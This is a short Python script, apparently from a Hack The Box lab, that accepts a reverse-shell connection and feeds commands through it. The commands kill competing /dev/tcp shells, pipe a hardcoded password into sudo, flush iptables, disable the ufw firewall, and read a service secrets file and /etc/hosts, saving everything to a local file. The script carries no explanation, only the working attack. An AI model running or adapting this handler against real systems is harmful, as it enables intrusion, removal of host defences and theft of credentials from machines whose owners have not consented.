#!/usr/bin/env python3
"""Single reverse shell with recon commands; cleanup forks first."""
import socket
import threading
import sys
import time

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 5555
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", PORT))
s.listen(1)
print(f"listen {PORT}", flush=True)
c, a = s.accept()
print(f"conn {a}", flush=True)
buf = b""


def pump():
    global buf
    while True:
        d = c.recv(8192)
        if not d:
            break
        buf += d
        sys.stdout.buffer.write(d)
        sys.stdout.flush()


threading.Thread(target=pump, daemon=True).start()
time.sleep(1)

cmds = r"""
pkill -f 'dev/tcp' 2>/dev/null || true
sleep 1
echo 'opc0932k90%%lODFI93-++' | sudo -S bash -c 'iptables -F; iptables -X; iptables -t nat -F; ufw disable; cat /etc/aegis-render.env; echo ===HOSTS===; cat /etc/hosts; echo ===DONE==='
"""
for line in cmds.strip().splitlines():
    c.send((line + "\n").encode())
    time.sleep(1.5)

time.sleep(5)
open(r"C:\Users\tdgf\OneDrive\Bureau\CODE\Repo\HTB\shell_out.txt", "wb").write(buf)
print("\nsaved shell_out.txt", flush=True)
c.close()
